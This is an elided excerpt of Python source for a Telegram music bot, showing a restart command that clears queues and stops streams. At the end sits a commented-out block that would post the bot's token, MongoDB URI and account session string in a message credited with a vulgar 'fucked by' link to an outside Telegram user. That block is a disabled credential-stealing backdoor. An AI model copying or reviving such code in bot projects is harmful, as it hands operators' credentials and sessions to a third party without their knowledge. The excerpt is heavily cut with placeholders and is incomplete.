...
from Sifra.utils.database import get_assistant, get_authuser_names, get_cmode
from Sifra.utils.decorators import ActualAdminCB, AdminActual, language
from Sifra.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await Ayano.stop_stream_force(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await Ayano.stop_stream_force(chat_id)
        except:
            pass
...
#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Ayano_sagar_121)............☆""",
#        reply_markup=InlineKeyboardMarkup(
#             [
#                 [
#                      InlineKeyboardButton(
#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/Ayano_sagar_121")
#                 ]
#            ]
#         ),
#     )
